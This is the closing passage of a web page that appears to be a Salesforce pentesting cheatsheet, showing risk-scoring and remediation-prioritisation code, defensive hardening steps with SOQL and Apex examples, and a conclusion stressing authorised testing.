</span><span id="__span-91-27"><a id="__codelineno-91-27" name="__codelineno-91-27" href="#__codelineno-91-27"></a>    <span class="c1"># Risk categorization</span>
</span><span id="__span-91-28"><a id="__codelineno-91-28" name="__codelineno-91-28" href="#__codelineno-91-28"></a>    <span class="k">if</span> <span class="n">risk_score</span> <span class="o">&gt;=</span> <span class="mi">20</span><span class="p">:</span>
</span><span id="__span-91-29"><a id="__codelineno-91-29" name="__codelineno-91-29" href="#__codelineno-91-29"></a>        <span class="n">risk_level</span> <span class="o">=</span> <span class="s1">&#39;Critical&#39;</span>
</span><span id="__span-91-30"><a id="__codelineno-91-30" name="__codelineno-91-30" href="#__codelineno-91-30"></a>    <span class="k">elif</span> <span class="n">risk_score</span> <span class="o">&gt;=</span> <span class="mi">15</span><span class="p">:</span>
</span><span id="__span-91-31"><a id="__codelineno-91-31" name="__codelineno-91-31" href="#__codelineno-91-31"></a>        <span class="n">risk_level</span> <span class="o">=</span> <span class="s1">&#39;High&#39;</span>
</span><span id="__span-91-32"><a id="__codelineno-91-32" name="__codelineno-91-32" href="#__codelineno-91-32"></a>    <span class="k">elif</span> <span class="n">risk_score</span> <span class="o">&gt;=</span> <span class="mi">10</span><span class="p">:</span>
</span><span id="__span-91-33"><a id="__codelineno-91-33" name="__codelineno-91-33" href="#__codelineno-91-33"></a>        <span class="n">risk_level</span> <span class="o">=</span> <span class="s1">&#39;Medium&#39;</span>
</span><span id="__span-91-34"><a id="__codelineno-91-34" name="__codelineno-91-34" href="#__codelineno-91-34"></a>    <span class="k">elif</span> <span class="n">risk_score</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span>
</span><span id="__span-91-35"><a id="__codelineno-91-35" name="__codelineno-91-35" href="#__codelineno-91-35"></a>        <span class="n">risk_level</span> <span class="o">=</span> <span class="s1">&#39;Low&#39;</span>
</span><span id="__span-91-36"><a id="__codelineno-91-36" name="__codelineno-91-36" href="#__codelineno-91-36"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-91-37"><a id="__codelineno-91-37" name="__codelineno-91-37" href="#__codelineno-91-37"></a>        <span class="n">risk_level</span> <span class="o">=</span> <span class="s1">&#39;Informational&#39;</span>
</span><span id="__span-91-38"><a id="__codelineno-91-38" name="__codelineno-91-38" href="#__codelineno-91-38"></a>
</span><span id="__span-91-39"><a id="__codelineno-91-39" name="__codelineno-91-39" href="#__codelineno-91-39"></a>    <span class="k">return</span> <span class="p">{</span>
</span><span id="__span-91-40"><a id="__codelineno-91-40" name="__codelineno-91-40" href="#__codelineno-91-40"></a>        <span class="s1">&#39;score&#39;</span><span class="p">:</span> <span class="n">risk_score</span><span class="p">,</span>
</span><span id="__span-91-41"><a id="__codelineno-91-41" name="__codelineno-91-41" href="#__codelineno-91-41"></a>        <span class="s1">&#39;level&#39;</span><span class="p">:</span> <span class="n">risk_level</span><span class="p">,</span>
</span><span id="__span-91-42"><a id="__codelineno-91-42" name="__codelineno-91-42" href="#__codelineno-91-42"></a>        <span class="s1">&#39;impact&#39;</span><span class="p">:</span> <span class="n">impact_score</span><span class="p">,</span>
</span><span id="__span-91-43"><a id="__codelineno-91-43" name="__codelineno-91-43" href="#__codelineno-91-43"></a>        <span class="s1">&#39;likelihood&#39;</span><span class="p">:</span> <span class="n">likelihood_score</span>
</span><span id="__span-91-44"><a id="__codelineno-91-44" name="__codelineno-91-44" href="#__codelineno-91-44"></a>    <span class="p">}</span>
</span><span id="__span-91-45"><a id="__codelineno-91-45" name="__codelineno-91-45" href="#__codelineno-91-45"></a>
</span><span id="__span-91-46"><a id="__codelineno-91-46" name="__codelineno-91-46" href="#__codelineno-91-46"></a><span class="k">def</span><span class="w"> </span><span class="nf">prioritize_remediation</span><span class="p">(</span><span class="n">findings</span><span class="p">):</span>
</span><span id="__span-91-47"><a id="__codelineno-91-47" name="__codelineno-91-47" href="#__codelineno-91-47"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Prioritize remediation based on risk scores and business factors&quot;&quot;&quot;</span>
</span><span id="__span-91-48"><a id="__codelineno-91-48" name="__codelineno-91-48" href="#__codelineno-91-48"></a>
</span><span id="__span-91-49"><a id="__codelineno-91-49" name="__codelineno-91-49" href="#__codelineno-91-49"></a>    <span class="n">prioritized_findings</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">findings</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span id="__span-91-50"><a id="__codelineno-91-50" name="__codelineno-91-50" href="#__codelineno-91-50"></a>        <span class="n">x</span><span class="o">.</span><span class="n">risk_score</span><span class="p">,</span>
</span><span id="__span-91-51"><a id="__codelineno-91-51" name="__codelineno-91-51" href="#__codelineno-91-51"></a>        <span class="n">x</span><span class="o">.</span><span class="n">ease_of_exploitation</span><span class="p">,</span>
</span><span id="__span-91-52"><a id="__codelineno-91-52" name="__codelineno-91-52" href="#__codelineno-91-52"></a>        <span class="n">x</span><span class="o">.</span><span class="n">affected_user_count</span>
</span><span id="__span-91-53"><a id="__codelineno-91-53" name="__codelineno-91-53" href="#__codelineno-91-53"></a>    <span class="p">),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-91-54"><a id="__codelineno-91-54" name="__codelineno-91-54" href="#__codelineno-91-54"></a>
</span><span id="__span-91-55"><a id="__codelineno-91-55" name="__codelineno-91-55" href="#__codelineno-91-55"></a>    <span class="n">remediation_timeline</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-91-56"><a id="__codelineno-91-56" name="__codelineno-91-56" href="#__codelineno-91-56"></a>        <span class="s1">&#39;immediate&#39;</span><span class="p">:</span> <span class="p">[],</span>  <span class="c1"># Critical findings, fix within 24-48 hours</span>
</span><span id="__span-91-57"><a id="__codelineno-91-57" name="__codelineno-91-57" href="#__codelineno-91-57"></a>        <span class="s1">&#39;short_term&#39;</span><span class="p">:</span> <span class="p">[],</span>  <span class="c1"># High findings, fix within 1-2 weeks</span>
</span><span id="__span-91-58"><a id="__codelineno-91-58" name="__codelineno-91-58" href="#__codelineno-91-58"></a>        <span class="s1">&#39;medium_term&#39;</span><span class="p">:</span> <span class="p">[],</span>  <span class="c1"># Medium findings, fix within 1-3 months</span>
</span><span id="__span-91-59"><a id="__codelineno-91-59" name="__codelineno-91-59" href="#__codelineno-91-59"></a>        <span class="s1">&#39;long_term&#39;</span><span class="p">:</span> <span class="p">[]</span>  <span class="c1"># Low findings, fix within next release cycle</span>
</span><span id="__span-91-60"><a id="__codelineno-91-60" name="__codelineno-91-60" href="#__codelineno-91-60"></a>    <span class="p">}</span>
</span><span id="__span-91-61"><a id="__codelineno-91-61" name="__codelineno-91-61" href="#__codelineno-91-61"></a>
</span><span id="__span-91-62"><a id="__codelineno-91-62" name="__codelineno-91-62" href="#__codelineno-91-62"></a>    <span class="k">for</span> <span class="n">finding</span> <span class="ow">in</span> <span class="n">prioritized_findings</span><span class="p">:</span>
</span><span id="__span-91-63"><a id="__codelineno-91-63" name="__codelineno-91-63" href="#__codelineno-91-63"></a>        <span class="k">if</span> <span class="n">finding</span><span class="o">.</span><span class="n">risk_level</span> <span class="o">==</span> <span class="s1">&#39;Critical&#39;</span><span class="p">:</span>
</span><span id="__span-91-64"><a id="__codelineno-91-64" name="__codelineno-91-64" href="#__codelineno-91-64"></a>            <span class="n">remediation_timeline</span><span class="p">[</span><span class="s1">&#39;immediate&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">finding</span><span class="p">)</span>
</span><span id="__span-91-65"><a id="__codelineno-91-65" name="__codelineno-91-65" href="#__codelineno-91-65"></a>        <span class="k">elif</span> <span class="n">finding</span><span class="o">.</span><span class="n">risk_level</span> <span class="o">==</span> <span class="s1">&#39;High&#39;</span><span class="p">:</span>
</span><span id="__span-91-66"><a id="__codelineno-91-66" name="__codelineno-91-66" href="#__codelineno-91-66"></a>            <span class="n">remediation_timeline</span><span class="p">[</span><span class="s1">&#39;short_term&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">finding</span><span class="p">)</span>
</span><span id="__span-91-67"><a id="__codelineno-91-67" name="__codelineno-91-67" href="#__codelineno-91-67"></a>        <span class="k">elif</span> <span class="n">finding</span><span class="o">.</span><span class="n">risk_level</span> <span class="o">==</span> <span class="s1">&#39;Medium&#39;</span><span class="p">:</span>
</span><span id="__span-91-68"><a id="__codelineno-91-68" name="__codelineno-91-68" href="#__codelineno-91-68"></a>            <span class="n">remediation_timeline</span><span class="p">[</span><span class="s1">&#39;medium_term&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">finding</span><span class="p">)</span>
</span><span id="__span-91-69"><a id="__codelineno-91-69" name="__codelineno-91-69" href="#__codelineno-91-69"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-91-70"><a id="__codelineno-91-70" name="__codelineno-91-70" href="#__codelineno-91-70"></a>            <span class="n">remediation_timeline</span><span class="p">[</span><span class="s1">&#39;long_term&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">finding</span><span class="p">)</span>
</span><span id="__span-91-71"><a id="__codelineno-91-71" name="__codelineno-91-71" href="#__codelineno-91-71"></a>
</span><span id="__span-91-72"><a id="__codelineno-91-72" name="__codelineno-91-72" href="#__codelineno-91-72"></a>    <span class="k">return</span> <span class="n">remediation_timeline</span>
</span></code></pre></div></p>
<hr />
<h2 id="remediation-hardening-recommendations">Remediation &amp; Hardening Recommendations</h2>
<h3 id="1-immediate-security-controls">1. Immediate Security Controls</h3>
<p><strong>Critical Actions (24-48 hours)</strong>:</p>
<ol>
<li><strong>Enable MFA for All Users</strong>:</li>
<li>Navigate to Setup â†’ Single Sign-On Settings â†’ Multi-Factor Authentication</li>
<li>Enable "Multi-factor authentication for all direct UI logins"</li>
<li>
<p>Require MFA for high-privilege profiles</p>
</li>
<li>
<p><strong>Review Administrative Permissions</strong>:
   <div class="language-sql highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="c1">-- Audit and restrict users with dangerous permissions</span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="w"> </span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Enable Session Security</strong>:</p>
</li>
<li>Setup â†’ Security â†’ Session Settings</li>
<li>Enable "Lock sessions to IP address"</li>
<li>Set session timeout to 2 hours maximum</li>
<li>
<p>Enable "High assurance session required"</p>
</li>
<li>
<p><strong>Implement IP Restrictions</strong>:</p>
</li>
<li>Setup â†’ Security â†’ Network Access</li>
<li>Configure IP ranges for admin profiles</li>
<li>Enable "Enforce IP restrictions" for sensitive profiles</li>
</ol>
<h3 id="2-short-term-security-improvements-1-2-weeks">2. Short-Term Security Improvements (1-2 weeks)</h3>
<ol>
<li>
<p><strong>Field-Level Security Implementation</strong>:
   <div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>// Implement proper FLS checks in all Apex code
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>public with sharing class SecureController {
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>    public List&lt;Contact&gt; getContacts() {
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>        if (!Schema.sObjectType.Contact.fields.SSN__c.isAccessible()) {
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>            throw new AuraHandledException(&#39;Access Denied&#39;);
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>        }
</span><span id="__span-93-7"><a id="__codelineno-93-7" name="__codelineno-93-7" href="#__codelineno-93-7"></a>        return [SELECT Id, Name, SSN__c FROM Contact WITH SECURITY_ENFORCED];
</span><span id="__span-93-8"><a id="__codelineno-93-8" name="__codelineno-93-8" href="#__codelineno-93-8"></a>    }
</span><span id="__span-93-9"><a id="__codelineno-93-9" name="__codelineno-93-9" href="#__codelineno-93-9"></a>}
</span></code></pre></div></p>
</li>
<li>
<p><strong>Platform Encryption Deployment</strong>:</p>
</li>
<li>Setup â†’ Security â†’ Platform Encryption</li>
<li>Enable encryption for sensitive fields (SSN, Credit Card, etc.)</li>
<li>
<p>Implement proper key management</p>
</li>
<li>
<p><strong>Sharing Model Hardening</strong>:</p>
</li>
<li>Review and restrict Organization-Wide Defaults</li>
<li>Audit sharing rules for over-permissive access</li>
<li>Implement role hierarchy properly</li>
</ol>
<h3 id="3-long-term-security-strategy-1-3-months">3. Long-Term Security Strategy (1-3 months)</h3>
<ol>
<li>
<p><strong>Security Monitoring Implementation</strong>:
   <div class="language-sql highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="c1">-- Create monitoring queries for suspicious activity</span>
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">UserId</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">LoginTime</span><span class="p">,</span><span class="w"> </span><span class="n">SourceIp</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span>
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">LoginHistory</span><span class="w"> </span>
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">LoginTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LAST_N_DAYS</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span>
</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Failed&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Invalid Password&#39;</span><span class="p">)</span>
</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LoginTime</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Code Security Standards</strong>:</p>
</li>
<li>Implement mandatory code reviews</li>
<li>Deploy SAST tools in CI/CD pipeline</li>
<li>
<p>Enforce secure coding standards</p>
</li>
<li>
<p><strong>Incident Response Procedures</strong>:</p>
</li>
<li>Develop security incident playbooks</li>
<li>Implement automated threat detection</li>
<li>Create user security training programs</li>
</ol>
<hr />
<h2 id="conclusion">Conclusion</h2>
<p>This comprehensive Salesforce pentesting cheatsheet provides expert-level guidance for security professionals conducting authorized security assessments. The methodologies, queries, and techniques documented here represent real-world attack vectors and should be used responsibly within the bounds of proper authorization.</p>
<p>Key takeaways for effective Salesforce security testing:</p>
<ol>
<li><strong>Focus on Custom Code</strong>: Standard Salesforce is generally secure; vulnerabilities primarily exist in custom development</li>
<li><strong>Understand the Platform</strong>: Salesforce's unique security model requires specialized knowledge</li>
<li><strong>Test Systematically</strong>: Follow a methodical approach covering all attack surfaces</li>
<li><strong>Document Thoroughly</strong>: Provide clear evidence and remediation guidance</li>
<li><strong>Think Like an Attacker</strong>: Chain vulnerabilities for maximum impact assessment</li>
</ol>
<p>Remember: The goal is not just to break things, but to help organizations build more secure Salesforce implementations. Use this knowledge responsibly to strengthen cloud security postures and protect sensitive business data.</p>
<hr />
<p><em>This cheatsheet represents a compilation of expert knowledge and should be used only for authorized security assessments. Always ensure proper written authorization before conducting any security testing activities.</em></p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "navigation.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
      
    
  </body>
</html>